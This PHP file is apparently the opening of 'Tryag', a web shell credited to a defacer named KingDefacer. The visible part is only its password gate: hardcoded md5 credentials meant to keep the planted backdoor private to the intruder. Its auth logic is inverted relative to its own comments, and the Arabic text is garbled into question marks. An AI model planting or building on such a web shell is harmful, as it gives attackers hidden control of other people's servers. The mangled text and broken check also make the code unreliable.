<?php 
/******************************************************************************************************/ 
/*  Tryag.php - Edited By KingDefacer
/*  ??U?E C??C?? C???E?: 
/*  by: 1.0 (03.10.2006) 
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/ 
/*   
/* 
/*  KingDefacer@msn.com
/******************************************************************************************************/ 
/* ~~~ C?I?C?CE | C?I?C?CE  ~~~ */ 

// ?EOU?? ???E C???? C???? C? E????? | Authentification 
// $auth = 1; - C???? ?C?I ?EOU?? C???? C????  ( authentification = On  ) 
// $auth = 0; - C???? ??? ?E???? C???? C???? ( authentification = Off ) 
$auth = 1; 

//  (Login & Password for access) 
// !!! (CHANGE THIS!!!) 
//  md5, C?EC???I ?C????? ?E? EO????? EUU 'tryag' 
// Login & password crypted with md5, default is 'tryag' 
$name='7c7f0f5f0f9e774ec437e1077e6c84a7'; // C????? C??O??  (user login) 
$pass='7c7f0f5f0f9e774ec437e1077e6c84a7'; // C?EC???I C??O?? (user password) 
/******************************************************************************************************/ 
if($auth == 0) { 
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass) 
   { 
   header('WWW-Authenticate: Basic realm="??? ?C?? ?C???E??"'); 
   header('HTTP/1.0 401 Unauthorized'); 
   exit("<b><a href=http://>tryag-team</a> : C?II?? ?U ???O E??C? ??? :)</b>"); 
   } 
} 
?>